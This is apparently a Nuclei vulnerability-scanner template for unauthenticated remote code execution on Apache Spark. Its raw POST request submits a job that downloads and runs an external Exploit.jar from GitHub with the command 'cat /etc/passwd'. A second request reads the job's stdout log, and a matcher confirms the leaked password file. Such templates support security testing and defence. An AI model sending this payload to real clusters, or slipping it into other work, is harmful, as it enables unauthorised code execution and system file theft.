id: apache-spark-rce
info:
  author: pikpikcu
  name: Apache Spark RCE
  reference: https://github.com/vulhub/vulhub/tree/master/spark/unacc
  severity: high
  tags: rce,apache,spark
requests:
- extractors:
  - internal: true
    name: driver
    part: body
    regex:
    - driver-(.*)-[0-9]+
    type: regex
  matchers:
  - part: body
    regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /v1/submissions/create HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
    \ (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nContent-Type: application/json\n\
    Content-Length: 614\n{\n  \"action\": \"CreateSubmissionRequest\",\n  \"clientSparkVersion\"\
    : \"2.3.1\",\n  \"appArgs\": [\n    \"cat /etc/passwd\"\n  ],\n  \"appResource\"\
    : \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\",\n  \"environmentVariables\"\
    : {\n    \"SPARK_ENV_LOADED\": \"1\"\n  },\n  \"mainClass\": \"Exploit\",\n  \"\
    sparkProperties\": {\n    \"spark.jars\": \"https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar\"\
    ,\n    \"spark.driver.supervise\": \"false\",\n    \"spark.app.name\": \"Exploit\"\
    ,\n    \"spark.eventLog.enabled\": \"true\",\n    \"spark.submit.deployMode\"\
    : \"cluster\",\n    \"spark.master\": \"spark://{{Hostname}}\"\n  }\n}\n"
  - 'GET /logPage/?driverId={{driver}}&logType=stdout HTTP/1.1

    Host: {{Hostname}}:8081

    User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)

    Connection: close

    Accept: */*

    Accept-Language: en

    '
